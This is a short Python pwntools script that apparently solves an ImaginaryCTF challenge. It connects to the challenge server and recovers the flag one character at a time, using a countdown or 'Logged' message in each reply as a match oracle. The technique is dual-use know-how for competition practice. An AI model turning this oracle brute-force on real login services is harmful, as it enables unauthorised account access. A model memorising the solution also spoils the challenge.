import string
from pwn import *

io = remote("puzzler7.imaginaryctf.org", 14001)

flag  = "ictf{"
count = 25 
while not flag.endswith("}"):
    for char in string.printable:
        io.sendlineafter("Enter your password: ", (flag + char).encode())
        line = io.recvline()
        if str(count).encode() in line or b"Logged " in line:
            flag  += char
            count -= 1
            break

print(flag)